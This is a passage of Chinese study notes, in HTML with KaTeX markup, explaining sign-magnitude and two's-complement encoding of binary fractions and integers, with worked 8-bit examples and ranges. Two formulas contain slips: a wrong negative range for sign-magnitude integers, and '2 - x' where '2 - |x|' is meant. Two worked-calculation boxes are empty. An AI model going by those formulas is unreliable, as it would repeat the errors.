<ul>
<li>
<p><strong>原码</strong>：用机器数的最高位表示数的符号，其余各位表示数的绝对值</p>
<p><strong>纯小数的原码定义：</strong></p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">[</mo><mi>x</mi><msub><mo stretchy="false">]</mo><mtext>原</mtext></msub><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo separator="true">,</mo><mspace width="8.109em"></mspace><mn>0</mn><mo>≤</mo><mi>x</mi><mo>&lt;</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>1</mn><mo>−</mo><mi>x</mi><mo>=</mo><mn>1</mn><mo>+</mo><mi mathvariant="normal">∣</mi><mi>x</mi><mi mathvariant="normal">∣</mi><mo separator="true">,</mo><mspace width="1.4226em"></mspace><mo>−</mo><mn>1</mn><mo>&lt;</mo><mi>x</mi><mo>≤</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow><mo stretchy="false">(</mo><mo stretchy="false">[</mo><mi>x</mi><msub><mo stretchy="false">]</mo><mtext>原&nbsp;是原码机器数，x&nbsp;是真值</mtext></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">
[x]_\text{原} =
\begin{cases}
x, \hspace{2.85cm} 0 \leq x \lt 1 \\
1 - x = 1 + |x|, \hspace{0.5cm} -1 \lt x \leq 0
\end{cases}
([x]_\text{原 是原码机器数，x 是真值})
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">原</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:8.109em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mpunct">,</span><span class="mspace" style="margin-right:1.4226em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">([</span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">原</span><span class="mord mtight">&nbsp;</span><span class="mord cjk_fallback mtight">是原码机器数，</span><span class="mord mtight">x&nbsp;</span><span class="mord cjk_fallback mtight">是真值</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p>
<p>例如：x<sub>1</sub> = +0.1101，x<sub>2</sub> = -0.1101，字长为 <code>8</code> 位。</p>
<p>原码表示为：</p>
<ul>
<li>[x<sub>1</sub>]<sub>原</sub> = 0.1101000</li>
<li>[x<sub>2</sub>]<sub>原</sub> = 1 - (-0.1101) = 1.0000000 + 0.1101000 = 1.1101000</li>
</ul>
<p>其中最高位为符号位。小数的 <strong>符号位</strong> 与 <strong>数值位</strong> 之间用 <strong>小数点</strong> 隔开。</p>
<p>若字长为 <code>n + 1</code>，则原码小数的表示范围为 -(1 - 2<sup>-n</sup>) ≤ x ≤ 1 - 2<sup>-n</sup>（关于原点对称）。</p>
<p><strong>纯整数的原码定义：</strong></p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">[</mo><mi>x</mi><msub><mo stretchy="false">]</mo><mtext>原</mtext></msub><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo separator="true">,</mo><mi>x</mi><mo separator="true">,</mo><mspace width="8.109em"></mspace><mn>0</mn><mo>≤</mo><mi>x</mi><mo>&lt;</mo><msup><mn>2</mn><mi>n</mi></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mn>2</mn><mi>n</mi></msup><mo>−</mo><mi>x</mi><mo>=</mo><msup><mn>2</mn><mi>n</mi></msup><mo>+</mo><mi mathvariant="normal">∣</mi><mi>x</mi><mi mathvariant="normal">∣</mi><mo separator="true">,</mo><mspace width="1.4226em"></mspace><mo>−</mo><mn>1</mn><mo>&lt;</mo><mi>x</mi><mo>≤</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow><mo stretchy="false">(</mo><mtext>x&nbsp;是真值，n&nbsp;是整数位数</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">
[x]_\text{原} =
\begin{cases}
0,x, \hspace{2.85cm} 0 \leq x \lt 2^n \\
2^n - x = 2^n + |x|, \hspace{0.5cm} -1 \lt x \leq 0
\end{cases}
(\text{x 是真值，n 是整数位数})
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">原</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:8.109em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mpunct">,</span><span class="mspace" style="margin-right:1.4226em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord text"><span class="mord">x&nbsp;</span><span class="mord cjk_fallback">是真值，</span><span class="mord">n&nbsp;</span><span class="mord cjk_fallback">是整数位数</span></span><span class="mclose">)</span></span></span></span></span></p>
<p>2<sup>n</sup> 中的 <code>n</code> 是整数位数，也就是数值有效部分的位数。</p>
<p>例如：x<sub>1</sub> = +1110，x<sub>2</sub> = -1110，字长为 <code>8</code> 位。</p>
<p>原码表示为：</p>
<ul>
<li>[x<sub>1</sub>]<sub>原</sub> = 0,0001110</li>
<li>[x<sub>2</sub>]<sub>原</sub> = 2<sup>7</sup> - (-1110) = 128 + 1110 = 10000000 + 00001110 = 1,0001110</li>
</ul>
<p>2<sup>7</sup> 中的 <code>7</code> 为 <strong>字长（8）- 符号位（1）</strong> 后所得的 <strong>整数位数（7）</strong></p>
<p>其中最高位为符号位。整数的 <strong>符号位</strong> 与 <strong>数值位</strong> 之间用 <strong>逗号</strong> 隔开。</p>
<p>若字长为 <code>n + 1</code>，则原码整数的表示范围为 -(2<sup>n</sup> - 1) ≤ x ≤ 2<sup>n</sup> - 1（关于原点对称）。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>真值零的原码表示有正零和负零两种：[+0]<sub>原</sub> = <strong>0</strong>0000；[-0]<sub>原</sub> = <strong>1</strong>0000</p>
</div>
</li>
<li>
<p><strong>补码</strong>：加减运算统一采用加法运算实现</p>
<details class="hint-container details"><summary>模（mod）的概念</summary>
<p><strong>模（mod）</strong> 是指一个计量系统的计数范围，例如：时钟。计算机也可以也可以看成一个计量机器，因为计算机的字长是定长的，即存储和处理的位数是有限的，因此它也有一个计量范围，即都存在一个模。如：时钟的计量范围是 0~11，<strong>模 = 12</strong>。表示 <code>n</code> 位的计算机计量范围是 0~2<sup>n</sup> -1，<strong>模 = 2<sup>n</sup></strong>。模实质上是计量器产生 “溢出” 的量，它的值在计量器上表示不出来，计量器上只能表示出 <strong>模的余数</strong>。任何有模的计量器，均可 <strong>化减法为加法运算（就是取反后加 1）</strong></p>
<p>假设当前时针指向 <code>8</code> 点，而准确时间是 <code>6</code> 点，调整时间可有以下两种拨法：</p>
<ol>
<li>倒拨 <code>2</code> 小时，即 <code>8 - 2 = 6</code></li>
<li>顺拨 10 小时，<code>8 + 10 = 12 + 6 = 6</code></li>
</ol>
<p>即 <code>8 - 2 = 8 + 10 = 8 + 12 - 2(mod 12)</code>。在 <code>12</code> 为模的系统里，加 10 和减 2 效果是一样的，因此凡是减 2 运算，都可以用加 10 来代替。若用一般公式可表示为：<code>a - b = a - b + mod = a + mod - b</code>。对模而言，<code>2</code> 和 <code>10</code> <strong>互为补数</strong>。实际上，以 <code>12</code> 为模的系统中，11 和 1、8 和 4、9 和 3、7 和 5、6 和 6 都有这个特性，共同的特点是 <strong>两者相加等于模</strong>。对于计算机，其概念和方法完全一样。<code>n</code> 位计算机，设 <code>n = 8</code>，所能表示的最大数是 <code>11111111</code>，若再加 1 成 <code>100000000</code>（9 位），但因只有 <code>8</code> 位，最高位 1 自然丢失（相当于丢失一个模）。又回到了 <code>00000000</code>，所以 <code>8</code> 位二进制系统的模为 <strong>2<sup>8</sup></strong>。在这样的系统中减法问题也可以化成加法问题，只需 <strong>把减数用相应的补数表示</strong> 就可以了。把补数用到计算机对数的处理上，就是补码</p>
</details>
<p><strong>纯小数的补码定义：</strong></p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">[</mo><mi>x</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo separator="true">,</mo><mspace width="7.54em"></mspace><mn>0</mn><mo>≤</mo><mi>x</mi><mo>&lt;</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>2</mn><mo>+</mo><mi>x</mi><mo>=</mo><mn>2</mn><mo>−</mo><mi>x</mi><mo separator="true">,</mo><mspace width="1.4226em"></mspace><mo>−</mo><mn>1</mn><mo>&lt;</mo><mi>x</mi><mo>≤</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext>&nbsp;</mtext><mn>2</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">
[x]_\text{补} = 
\begin{cases}
x, \hspace{2.65cm} 0 \leq x \lt 1 \\
2 + x = 2 - x, \hspace{0.5cm} -1 \lt x \leq 0
\end{cases}
(mod \space 2)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:7.54em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:1.4226em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace">&nbsp;</span><span class="mord">2</span><span class="mclose">)</span></span></span></span></span></p>
<p>例如：x<sub>1</sub> = +0.1001，x<sub>2</sub> = -0.0110，字长为 <code>8</code> 位。</p>
<p>补码表示为：</p>
<ul>
<li>[x<sub>1</sub>]<sub>补</sub> = 0.1001000</li>
<li>[x<sub>2</sub>]<sub>补</sub> = 2 + (-0.0110) = 2 - 0.0110 = 10.0000000 - 0.0110000 = 1.1010000</li>
</ul>
<div class="hint-container info">
<p class="hint-container-title">10.0000000 - 0.0110000 运算过程</p>
<p>由于十进制 <code>25 - 9 = 16</code> 在做减法运算时，首先 <code>个位（5）- 9</code> 不够减，就向前借一位（<strong>借 10</strong>）变成 <code>个位（10 + 5）- 9</code>，十位 <code>2</code> 就变成 <code>1</code>，最后得到的结果是 <code>16</code></p>
<p>因此二进制 <code>10.0000000 - 0.0110000</code> 在做减法运算时，不够减时，向前借一位（<strong>借 2</strong>）变成 <code>1.1120000 - 0.0110000</code>，最后得到的结果是 <code>1.1010000</code></p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></div>
<p>若字长为 <code>n + 1</code>，则补码小数的表示范围为 -1 ≤ x ≤ 1 - 2<sup>-n</sup>（比原码多表示 -1）。</p>
<p><strong>纯整数的补码定义：</strong></p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">[</mo><mi>x</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo separator="true">,</mo><mi>x</mi><mo separator="true">,</mo><mspace width="10.243em"></mspace><mn>0</mn><mo>≤</mo><mi>x</mi><mo>&lt;</mo><msup><mn>2</mn><mi>n</mi></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mn>2</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msup><mo>+</mo><mi>x</mi><mo>=</mo><msup><mn>2</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msup><mo>−</mo><mi mathvariant="normal">∣</mi><mi>x</mi><mi mathvariant="normal">∣</mi><mo separator="true">,</mo><mspace width="1.4226em"></mspace><mo>−</mo><msup><mn>2</mn><mi>n</mi></msup><mo>&lt;</mo><mi>x</mi><mo>≤</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext>&nbsp;</mtext><msup><mn>2</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">
[x]_\text{补} =
\begin{cases}
0,x, \hspace{3.6cm} 0 \leq x \lt 2^n \\
2^{n+1} + x = 2^{n+1} - |x|, \hspace{0.5cm} -2^n \lt x \leq 0
\end{cases}
(mod \space 2^{n+1})
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:10.243em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mpunct">,</span><span class="mspace" style="margin-right:1.4226em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace">&nbsp;</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p>
<p>例如：x<sub>1</sub> = +1010，x<sub>2</sub> = -1101，字长为 <code>8</code> 位。</p>
<p>补码表示为：</p>
<ul>
<li>[x<sub>1</sub>]<sub>补</sub> = 0,0001010</li>
<li>[x<sub>2</sub>]<sub>补</sub> = 2<sup>(7+1)</sup> + (-1101) = 2<sup>8</sup> - 1101 = 256 - 1101 = 100000000 - 00001101 = 1,1110011</li>
</ul>
<div class="hint-container info">
<p class="hint-container-title">100000000 - 00001101 运算过程</p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></div>
<p>若字长为 <code>n + 1</code>，则补码整数的表示范围为 -2<sup>n</sup> ≤ x ≤ 2<sup>n</sup> - 1（比原码多表示 -2<sup>n</sup>）。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>零的补码表示是唯一的：[+0]<sub>补</sub> = [-0]<sub>补</sub> = 0.0000</p>
</div>
<p><strong>补码与真值之间的转换:</strong></p>
<p>对补码而言，正数和负数的转换不同。正数补码的转换方式与原码的相同。</p>
<ul>
<li><strong>真值转换为补码</strong>：对于正数，与原码的方式一样。对于负数，符号位取 1，其余各位由真值 <strong>各位取反，末位加 1</strong> 得到</li>
<li><strong>补码转换为真值</strong>：若符号位为 0，与原码的方式一样。若符号位为 1，真值的符号为负，数值部分各位由补码 <strong>各位取反，末位加 1</strong> 得到</li>
</ul>
<p><strong>变形补码：</strong></p>
<p>变形补码又称模 4 补码，双符号位的补码小数，定义为：</p>
